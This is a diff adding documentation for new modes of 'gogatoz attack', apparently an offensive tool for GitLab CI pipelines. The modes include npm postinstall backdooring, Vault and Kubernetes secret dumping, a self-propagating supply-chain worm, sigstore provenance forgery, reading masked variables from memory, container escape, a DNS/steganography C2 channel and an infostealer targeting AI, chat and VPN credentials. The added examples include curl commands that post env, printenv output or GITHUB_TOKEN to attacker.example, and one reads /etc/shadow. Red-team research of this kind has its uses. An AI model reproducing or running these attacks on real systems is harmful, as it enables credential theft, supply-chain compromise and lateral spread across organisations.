@@ -21,6 +21,17 @@ gogatoz attack [options]
 - Commit CI to target repo: `--commit-ci` with exactly one CI source: `--ci-yaml`, `--ci-file`, `--ci-stdin`, or `--payload`.
 - Secrets exfiltration: `--secrets` creates a pipeline that posts environment/variables to a webhook (optionally RSA-encrypts).
 - Payload rendering only: `--payload-only` prints a single-job .gitlab-ci.yml to stdout without committing.
+- npm registry tampering: `--npm-tamper` publishes a backdoored npm package via a CI pipeline targeting the project's npm registry.
+- Vault enumeration: `--vault-enum` enumerates HashiCorp Vault secrets reachable from CI job identity (JWT/OIDC auth).
+- Kubernetes secret sweep: `--k8s-secrets` dumps Kubernetes secrets from namespaces accessible to the CI runner's service account.
+- Dead man's switch: `--dead-mans-switch` installs a scheduled pipeline or external monitor that triggers a handler if the attacker's access is revoked.
+- Branch mutator: `--branch-mutator` replicates a malicious file across all (or filtered) branches in the target project.
+- Sigstore provenance: `--sigstore` generates a cosign-compatible provenance attestation for a tampered package to make it appear legitimately signed.
+- Memory dump: `--memory-dump` injects a CI job that scans `/proc/*/environ` and Runner Worker memory to extract masked CI variables, bypassing GitLab's log masking. Results saved as artifacts.
+- Container escape: `--container-escape` injects a CI job that detects privileged Docker executors and attempts escape via Docker socket, cgroup abuse, or nsenter. Enumerates host filesystem and running containers.
+- Supply chain worm: `--supply-chain-worm` discovers sibling repositories in the same group and injects CI payloads into each, creating self-propagating lateral movement across the organization.
+- Variable injection: `--variable-inject` uses the GitLab Variables API to create or modify CI/CD variables at project or group scope, affecting all downstream pipelines.
+- C2 channel: `--c2-channel` injects a CI job that establishes covert exfiltration via DNS tunneling (`dns-a`, `dns-txt`), ICMP encoding, or steganography (`steg-wav`, `steg-png`).
 
 ## Key Options
 
@@ -43,6 +54,7 @@ gogatoz attack [options]
   - `secrets` (alias: `secrets-exfil`): Dump env/variables to webhook.
   - `git-hook`: Install git hooks on runner build dirs to capture tokens from subsequent jobs.
   - `cache-poison`: Poison CI cache with malicious content (targets shared cache keys).
+  - `infostealer`: Expanded credential sweep (40+ paths) covering AI tools, chat/IM, VPN, K8s, Docker, `gh auth token`, and recursive `.env` file discovery.
 
 ### Common payload options
 - `--job-name` string: Job name.
@@ -85,6 +97,48 @@ gogatoz attack [options]
 - `--cache-key` string: Cache key to target (default: default).
 - `--cache-path` string: Cache path to poison (default: .).
 - `--poison-cmd` string: Command to run for cache poisoning.
+
+### npm-tamper options
+- `--npm-registry` string: npm registry URL to publish to (default: project's GitLab npm registry).
+- `--npm-package` string: Package name to tamper with (required).
+- `--npm-inject-script` string: Shell command to inject into the package's `postinstall` hook.
+
+### vault-enum options
+- `--vault-addr` string: HashiCorp Vault address (default: `$VAULT_ADDR` from CI environment).
+- `--vault-auth-method` string: Vault auth method: `jwt` or `oidc` (default: jwt).
+
+### k8s-secrets options
+- `--k8s-namespaces` string: Comma-separated Kubernetes namespaces to sweep (default: all accessible namespaces).
+
+### dead-mans-switch options
+- `--dms-monitor-url` string: URL the dead man's switch pings to confirm attacker presence (required).
+- `--dms-interval` string: Check interval (default: 1h). Accepts Go duration syntax (e.g., 30m, 2h).
+- `--dms-ttl` string: Time-to-live before the handler fires if the monitor URL stops responding (default: 24h).
+- `--dms-handler` string: Shell command or payload to execute when the switch triggers.
+- `--dms-platform` string: Where to install the switch: `scheduled-pipeline` or `external-cron` (default: scheduled-pipeline).
+
+### branch-mutator options
+- `--mutator-file` string: File path to create or overwrite in each branch (required).
+- `--mutator-content` string: Content for the mutated file. Use `--ci-file` to read from disk instead.
+- `--mutator-max-branches` int: Maximum number of branches to mutate (default: 0 = all branches).
+
+### sigstore options
+- `--sigstore-package` string: Package name or OCI reference to generate provenance for (required).
+- `--sigstore-version` string: Package version to attest (required).
+
+### Infostealer enhancements
+
+The `infostealer` payload type performs an expanded credential sweep across 40+ common credential paths on the runner filesystem, including:
+
+- **AI tools**: `.openai`, `.anthropic`, Copilot tokens, `.config/github-copilot`
+- **Chat / IM**: Slack tokens, Discord tokens, Teams webhooks
+- **VPN**: OpenVPN configs, WireGuard keys
+- **Kubernetes**: `~/.kube/config`, service account tokens at `/var/run/secrets/`
+- **Docker**: `~/.docker/config.json`, registry auth
+- **GitHub CLI**: `gh auth token` extraction
+- **Environment files**: Recursive `.env` file sweep across the build directory
+
+Use `--payload infostealer` with `--payload-only` to preview or with `--commit-ci` to deploy.
 
 ### Script injection (`--inject-script`)
 
@@ -175,6 +229,61 @@ Upload a malicious package to the Generic Packages registry.
 - `--package-name` string: Package name (required).
 - `--package-version` string: Package version (required).
 - `--package-file` string: Local file to upload (required).
+
+### Memory dump (`--memory-dump`)
+
+Inject a CI job that bypasses GitLab's masked variable protection by reading process memory directly.
+
+- `--memory-dump`: Enable memory dump mode.
+- `--memory-dump-proc` string: Specific `/proc/<pid>` to dump (auto-detect if empty).
+- `--memory-dump-filter` string: Regex to filter variables (default: `.*SECRET|.*TOKEN|.*KEY`).
+
+The payload scans `/proc/*/environ` of all running processes, reads Runner Worker memory via `/proc/<pid>/mem`, extracts token patterns (`glpat-`, `ghp_`, `AKIA`, `sk-`, `xoxb-`), sweeps credential files, and saves results as artifacts (`memdump_env.txt`, `memdump_tokens.txt`, `memdump_bundle.tgz`, `memdump_report.json`).
+
+### Container escape (`--container-escape`)
+
+Exploit privileged Docker executors to escape to the host system.
+
+- `--container-escape`: Enable container escape mode.
+- `--escape-method` string: Escape technique: `sshd|docker|kernel|nsenter` (default: `docker`).
+- `--escape-command` string: Command to execute on host (default: `bash`).
+- `--escape-mount-path` string: Host path to mount (default: `/`).
+
+The payload detects Docker sockets, privileged cgroups, and host mount points, then attempts escape via the available vector. Results saved as artifacts (`escape_bundle.tgz`, `escape_host_output.txt`).
+
+### Supply chain worm (`--supply-chain-worm`)
+
+Self-propagating CI injection across sibling repositories in a GitLab group.
+
+- `--supply-chain-worm`: Enable worm mode.
+- `--worm-target-group` string: Group ID or path to scope propagation.
+- `--worm-max-repos` int: Max sibling repos to propagate to (default: 5).
+- `--worm-payload` string: Shell payload to inject into sibling repos.
+
+The worm discovers sibling projects in the target group via the GitLab API, creates branches, and injects CI configs. Each infected project produces its own pipeline, enabling recursive propagation.
+
+### Variable injection (`--variable-inject`)
+
+Inject malicious CI/CD variables at project or group scope via the GitLab Variables API.
+
+- `--variable-inject`: Enable variable injection mode.
+- `--inject-vars` string: JSON array of key/value pairs: `'[{"key":"K","value":"V"}]'` (required).
+- `--inject-scope` string: Scope: `project|group` (default: `project`).
+- `--inject-group-id` string: Group ID for group-scope injection.
+- `--inject-protected`: Set as protected variable.
+- `--inject-masked`: Set as masked variable.
+
+### C2 channel (`--c2-channel`)
+
+Establish a covert command-and-control channel for data exfiltration.
+
+- `--c2-channel`: Enable C2 channel mode.
+- `--c2-method` string: Channel type: `dns-a|dns-txt|steg-wav|steg-png|icmp` (default: `dns-a`).
+- `--c2-target` string: Domain for DNS tunnel, URL for other methods (required).
+- `--c2-callback-url` string: Primary C2 callback URL.
+- `--c2-keepalive`: Keep C2 channel alive with heartbeats.
+
+The DNS methods encode environment data into subdomain queries (`<seq>.<chunk>.tun.<domain>`). Steganographic methods embed data in WAV/PNG artifacts uploaded via the GitLab Packages API.
 
 ### Persistence modes
 - `--deploy-key`: Create a deploy key with write access on the target project.
@@ -279,6 +388,85 @@ gogatoz attack --commit-ci --target group/proj \
 ```bash
 gogatoz attack --target group/proj --cleanup --cleanup-jobs \
   --cleanup-jobs-ref gogatoz-attack --cleanup-jobs-max 3
+```
+
+### 13) npm package tampering
+```bash
+gogatoz attack --npm-tamper --target group/proj \
+  --npm-package @scope/shared-utils --npm-inject-script 'curl -sd "$(env)" https://attacker.example/cb' \
+  --branch gogatoz-attack --deconflict suffix
+```
+
+### 14) Vault secret enumeration
+```bash
+gogatoz attack --vault-enum --target group/proj \
+  --vault-addr https://vault.internal:8200 --vault-auth-method jwt \
+  --tags shell
+```
+
+### 15) Kubernetes secret sweep
+```bash
+gogatoz attack --k8s-secrets --target group/proj \
+  --k8s-namespaces default,production,staging \
+  --tags kubernetes --webhook https://attacker.example/k8s
+```
+
+### 16) Dead man's switch persistence
+```bash
+gogatoz attack --dead-mans-switch --target group/proj \
+  --dms-monitor-url https://attacker.example/heartbeat \
+  --dms-interval 30m --dms-ttl 12h \
+  --dms-handler 'curl -sd "$(printenv)" https://attacker.example/dms-fired' \
+  --dms-platform scheduled-pipeline
+```
+
+### 17) Branch mutator (spread across branches)
+```bash
+gogatoz attack --branch-mutator --target group/proj \
+  --mutator-file .github/workflows/lint.yml \
+  --mutator-content 'run: curl -sd "$GITHUB_TOKEN" https://attacker.example/cb' \
+  --mutator-max-branches 10
+```
+
+### 18) Sigstore provenance forgery
+```bash
+gogatoz attack --sigstore --target group/proj \
+  --sigstore-package ghcr.io/org/app --sigstore-version v1.2.3 \
+  --tags shell --branch gogatoz-attack --deconflict suffix
+```
+
+### 19) Memory dump (bypass masked variables)
+```bash
+gogatoz attack --memory-dump --target group/proj \
+  --tags shell_executor --deconflict suffix
+```
+
+### 20) Container escape
+```bash
+gogatoz attack --container-escape --target group/proj \
+  --tags docker --escape-method docker \
+  --escape-command 'id; cat /etc/shadow; printenv | sort'
+```
+
+### 21) Supply chain worm propagation
+```bash
+gogatoz attack --supply-chain-worm --target group/proj \
+  --worm-target-group my-org --worm-max-repos 5 \
+  --worm-payload 'printenv | sort' --branch gogatoz-worm
+```
+
+### 22) Variable injection
+```bash
+gogatoz attack --variable-inject --target group/proj \
+  --inject-vars '[{"key":"NPM_TOKEN","value":"attacker-controlled"}]' \
+  --inject-scope project
+```
+
+### 23) C2 channel (DNS tunnel)
+```bash
+gogatoz attack --c2-channel --target group/proj \
+  --c2-method dns-a --c2-target exfil.attacker.com \
+  --tags shell_executor --deconflict suffix
 ```
 
 ## Security Considerations
